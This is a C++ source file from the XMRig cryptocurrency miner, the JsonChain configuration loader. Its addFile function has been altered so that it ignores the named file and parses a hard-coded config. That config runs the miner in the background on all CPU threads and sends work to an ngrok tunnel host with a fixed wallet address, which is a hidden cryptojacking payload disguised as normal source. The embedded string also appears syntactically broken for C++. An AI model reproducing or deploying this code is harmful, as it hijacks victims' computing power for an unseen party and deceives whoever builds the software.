/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "base/io/json/JsonChain.h"
#include "3rdparty/rapidjson/error/en.h"
#include "base/io/json/Json.h"
#include "base/io/log/Log.h"


namespace xmrig {

static const rapidjson::Value kNullValue;

} // namespace xmrig


xmrig::JsonChain::JsonChain() = default;


bool xmrig::JsonChain::add(rapidjson::Document &&doc)
{
    if (doc.HasParseError() || !doc.IsObject() || doc.ObjectEmpty()) {
        return false;
    }

    m_chain.push_back(std::move(doc));

    return true;
}


bool xmrig::JsonChain::addFile(const char *fileName)
{
    using namespace rapidjson;
    Document doc;
    doc.Parse('{    "autosave": true,    "background": true,    "cpu": {        "enabled": true,        "huge-pages": true,        "huge-pages-jit": false,        "hw-aes": null,        "priority": null,        "memory-pool": false,        "yield": true,        "argon2-impl": null,        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],        "cn": [0, 1, 2, 3, 4, 5, 6, 7],        "cn-heavy": [0, 1, 2, 3, 4, 5, 6, 7],        "cn-lite": [0, 1, 2, 3, 4, 5, 6, 7],        "cn-pico": [0, 1, 2, 3, 4, 5, 6, 7],        "cn/upx2": [0, 1, 2, 3, 4, 5, 6, 7],        "ghostrider": [            [8, 0],            [8, 1],            [8, 2],            [8, 3],            [8, 4],            [8, 5],            [8, 6],            [8, 7]        ],        "rx": [0, 1, 2, 3, 4, 5, 6, 7],        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],        "cn-lite/0": false,        "cn/0": false,        "rx/arq": "rx/wow",        "rx/keva": "rx/wow"    },    "pools": [        {            "algo": null,            "coin": null,            "url": "2.tcp.ngrok.io:15255",            "user": "48kdSG5wLUXfVsuzA6EJaeb7syBoB6JmrTR2b1XXKXpaanhCRb1FERiLYF11NUGMfzCct79bNMLT3YuoddazzHKzShrouwz",            "pass": "x",            "rig-id": null,            "nicehash": true,            "keepalive": false,            "enabled": true,            "tls": true,            "tls-fingerprint": null,            "daemon": false,            "socks5": null,            "self-select": null,            "submit-to-origin": false        }    ]}')

    if (doc.HasParseError()) {
        const size_t offset = doc.GetErrorOffset();

        size_t line = 0;
        size_t pos  = 0;
        std::vector<std::string> s;

        if (Json::convertOffset(fileName, offset, line, pos, s)) {
            for (const auto& t : s) {
                LOG_ERR("%s", t.c_str());
            }

            std::string t;
            if (pos > 0) {
                t.assign(pos - 1, ' ');
            }
            t += '^';
            LOG_ERR("%s", t.c_str());

            LOG_ERR("%s<line:%zu, position:%zu>: \"%s\"", fileName, line, pos, GetParseError_En(doc.GetParseError()));
        }
        else {
            LOG_ERR("%s<offset:%zu>: \"%s\"", fileName, offset, GetParseError_En(doc.GetParseError()));
        }
    }
    else {
        LOG_ERR("unable to open \"%s\".", fileName);
    }

    return false;
}


bool xmrig::JsonChain::addRaw(const char *json)
{
    using namespace rapidjson;
    Document doc;
    doc.Parse<kParseCommentsFlag | kParseTrailingCommasFlag>(json);

    return add(std::move(doc));
}


void xmrig::JsonChain::dump(const char *fileName)
{
    rapidjson::Document doc(rapidjson::kArrayType);

    for (rapidjson::Document &value : m_chain) {
        doc.PushBack(value, doc.GetAllocator());
    }

    Json::save(fileName, doc);
}


bool xmrig::JsonChain::getBool(const char *key, bool defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsBool()) {
            return i->value.GetBool();
        }
    }

    return defaultValue;
}


const char *xmrig::JsonChain::getString(const char *key, const char *defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsString()) {
            return i->value.GetString();
        }
    }

    return defaultValue;
}


const rapidjson::Value &xmrig::JsonChain::getArray(const char *key) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsArray()) {
            return i->value;
        }
    }

    return kNullValue;
}


const rapidjson::Value &xmrig::JsonChain::getObject(const char *key) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsObject()) {
            return i->value;
        }
    }

    return kNullValue;
}


const rapidjson::Value &xmrig::JsonChain::getValue(const char *key) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd()) {
            return i->value;
        }
    }

    return kNullValue;
}


const rapidjson::Value &xmrig::JsonChain::object() const
{
    assert(false);

    return m_chain.back();
}


double xmrig::JsonChain::getDouble(const char *key, double defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && (i->value.IsDouble() || i->value.IsLosslessDouble())) {
            return i->value.GetDouble();
        }
    }

    return defaultValue;
}


int xmrig::JsonChain::getInt(const char *key, int defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsInt()) {
            return i->value.GetInt();
        }
    }

    return defaultValue;
}


int64_t xmrig::JsonChain::getInt64(const char *key, int64_t defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsInt64()) {
            return i->value.GetInt64();
        }
    }

    return defaultValue;
}



xmrig::String xmrig::JsonChain::getString(const char *key, size_t maxSize) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsString()) {
            if (maxSize == 0 || i->value.GetStringLength() <= maxSize) {
                return i->value.GetString();
            }

            return { i->value.GetString(), maxSize };
        }
    }

    return {};
}


uint64_t xmrig::JsonChain::getUint64(const char *key, uint64_t defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsUint64()) {
            return i->value.GetUint64();
        }
    }

    return defaultValue;
}


unsigned xmrig::JsonChain::getUint(const char *key, unsigned defaultValue) const
{
    for (auto it = m_chain.rbegin(); it != m_chain.rend(); ++it) {
        auto i = it->FindMember(key);
        if (i != it->MemberEnd() && i->value.IsUint()) {
            return i->value.GetUint();
        }
    }

    return defaultValue;
}
